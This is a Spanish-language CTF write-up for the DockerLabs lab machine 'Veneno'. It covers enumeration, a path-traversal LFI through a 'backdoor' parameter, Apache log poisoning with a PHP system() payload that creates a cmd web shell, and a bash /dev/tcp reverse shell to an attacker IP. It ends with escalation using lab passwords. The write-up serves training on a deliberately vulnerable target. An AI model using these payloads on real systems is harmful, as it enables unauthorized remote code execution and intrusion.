# Máquina Veneno

Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/kOFDBYJC#mzBiVsOorShPcTLjPfzmesxAiCHxGkKEDAGxAIJ0r0g)

![imagen](https://github.com/user-attachments/assets/7dfeacdc-45b1-4877-9e70-262b06cdbe3b)

- **Nombre de la Máquina:** Veneno
- **Sistema Operativo:** Linux
- **Dificultad:** Medio
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
  - LFI (Local File Inclusion)
  - Log Poisoning
- **Escalada de Privilegios:**
  - Encontrar la contraseña del usuario 'carlos'
  - Buscar en archivos para descubrir la contraseña root

## Reconocimiento y Enumeración
Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina objetivo para identificar los puertos abiertos.

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/bc125347-c516-40e1-a27f-2fd3bc077543)

El escaneo muestra que los puertos 22 y 80 están abiertos. Realizamos un análisis más detallado para determinar qué servicios se están ejecutándose en estos puertos.

```bash
sudo nmap -p 22,80 -sCV 172.17.0.2 -oN targeted.txt
```

![imagen](https://github.com/user-attachments/assets/6f4a971e-92d6-4890-9ce6-11b0442f2235)

### Puerto 80 HTTP
Lanzamos un `whatweb` para ver qué servicios corren en el puerto HTTP.

![imagen](https://github.com/user-attachments/assets/bb1931c7-d6f7-4d0e-88fa-4af225e1faf4)

Nos encontramos la página por defecto de ubuntu apache2.

![imagen](https://github.com/user-attachments/assets/52aae76f-178b-492d-bb92-4c736a21c7fe)

Haremos una búsqueda de directorios utilizando `gobuster`.

```bash
gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 150
```

![imagen](https://github.com/user-attachments/assets/b5d71b73-0f9e-4154-9616-386532a22215)

Encontramos dos directorios: `/problems.php` y `/uploads/`. Dentro de `uploads` no encontramos nada, está vacío y en `problems.php` parece ser que está cargando el mismo index que la página principal de apache2.

![imagen](https://github.com/user-attachments/assets/95c5e712-7f63-419b-a715-04d9d215cb6d)

![imagen](https://github.com/user-attachments/assets/6a563e1b-fdb7-49d7-abbd-fe826c342b5b)

Haremos fuerza bruta usando wfuzz para buscar algún parámetro específico que esté contemplado en `/problems.php`.

```bash
wfuzz -c -u "http://172.17.0.2/problems.php?FUZZ=../../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --hl 363
```

![imagen](https://github.com/user-attachments/assets/62c0b64b-7bdc-47f6-b335-8d9b23f1497a)

Encontró el parámetro `backdoor`, y si miramos en la web, estamos aconteciendo un LFI (Local File Inclusion).

```url
http://172.17.0.2/problems.php?backdoor=../../../../etc/passwd
```

![imagen](https://github.com/user-attachments/assets/f40f6145-6c7f-4183-92d9-03230520f4a4)

Actualmente podremos leer los archivos de la máquina víctima, y también vemos que por ahora solo existe el usuario `carlos`.
Me envio la petición a burpsuite para verlo mejor y probar a ver si se puede acontecer un `Log Poisoning`.

![imagen](https://github.com/user-attachments/assets/6d7b26c7-f23a-4be8-ab65-232b2606f605)

Para el log poisoning hay que apuntar al archivo `/var/log/apache2/error.log`.

![imagen](https://github.com/user-attachments/assets/32ce787e-e96b-4ed8-b793-80a49e54aef0)

Vemos que apunta al archivo indicado, vamos a probar el `Log Poisoning`. Para ello debemos de causar un error apuntando hacia el comando que queramos, por ejemplo lo siguiente:

```url
http://172.17.0.2/%3C%3fphp%20system('whoami');%20%3f%3E.php
```

Y al cargar otra vez el archivo `error.log` veremos que se ha ejecutado el comando:

![imagen](https://github.com/user-attachments/assets/fa75a6d7-aa9e-4d75-a9b5-5d0b730185f6)

Una vez en este punto lo que se me ocurre es agregar un parámetro llamado `cmd` en el cuál podamos ejecutar comandos y de ahí mandarnos una reverse shell.

```url
http://172.17.0.2/%3C%3fphp%20system('$_GET[%22cmd%22]');%20%3f%3E.php
```

Ejecutamos el comando `id` para comprobar si funciona el parámetro, y funciona correctamente.
```url
http://172.17.0.2/problems.php?backdoor=../../../../var/log/apache2/error.log&cmd=id
```

![imagen](https://github.com/user-attachments/assets/a89370a1-167b-45f0-b198-8fb09fcec4f5)

Ahora cambiamos el comando `id` por el siguiente para mandarnos la reverse shell:

```bash
172.17.0.2/problems.php?backdoor=../../../../var/log/apache2/error.log&cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

Nos ponemos en escucha por el puerto 443 y nos mandamos la reverse shell.

![imagen](https://github.com/user-attachments/assets/d0892142-372a-4591-b974-3a9a0fedd481)

## Escalada de privilegios a Carlos
Una vez dentro miro si tengo privilegios con sudo pero no tengo, también miro si tengo privilegios SUID en algún binario y tampoco.

![imagen](https://github.com/user-attachments/assets/a0053bab-1554-47ad-9bff-944a111eb309)

Haciendo un `ls` encuentro un txt que dice lo siguiente:

```txt
Es imposible que me acuerde de la pass es inhackeable pero se que la tenpo en el mismo fichero desde fa 24 anys. trobala buscala
soy el unico user del sistema.
```

![imagen](https://github.com/user-attachments/assets/5a3b46ea-d626-4686-8608-90b4b3866269)

El texto está mal escrito pero algo se entiende... Pruebo a buscar por todos los archivos que acaben en .txt y encuentro uno interesante.

```bash
find / -name "*.txt" 2>/dev/null
```

![imagen](https://github.com/user-attachments/assets/d3e30ee9-f358-4e95-b9c3-6892d867b491)

```bash
cat /usr/share/viejuno/inhackeable_pass.txt
```

![imagen](https://github.com/user-attachments/assets/002ceae2-e45d-4991-96d4-ad946d562172)

Pues la password de `carlos` es **pinguinochocolatero**.

![imagen](https://github.com/user-attachments/assets/c0040a80-4786-4c92-ba89-8fc32b5d22b0)

## Escalada de privilegios a root
En el directorio de carlos encuentro 100 carpetas y supongo que tendré que encontrar algo en alguna de ellas. Tampoco tengo privilegios de sudo ni binarios SUID.

![imagen](https://github.com/user-attachments/assets/bd4e56b6-bcb4-48e2-90db-73fb9a054de1)

```bash
ls -la carpeta*
```

Con ese comando hago un `ls` a todas las carpetas y mirando desde la terminal veo que la carpeta55 tiene un archivo .jpg

![imagen](https://github.com/user-attachments/assets/b64bf982-5ec4-40c6-92d6-2e6d7ccb43eb)

Nos lo mandamos a nuestra máquina atacante mediante el uso de python y la analizamos con `exiftool`.

```bash
python3 -m http.server 80
```

```bash
exiftool .toor.jpg
```

![imagen](https://github.com/user-attachments/assets/441d2c74-c1ce-430a-af0f-65511c000141)

Encuentro en una de las informaciones lo siguiente:
```
Image Quality                   : pingui1730
```

Pruebo esa posible contraseña para identificarme como root y resulta que esa es la password, y ya habríamos escalado los privilegios a root.

```bash
su root
pingui1730
```

![imagen](https://github.com/user-attachments/assets/33623ee5-e35b-4db0-8d42-0c4af01998d2)
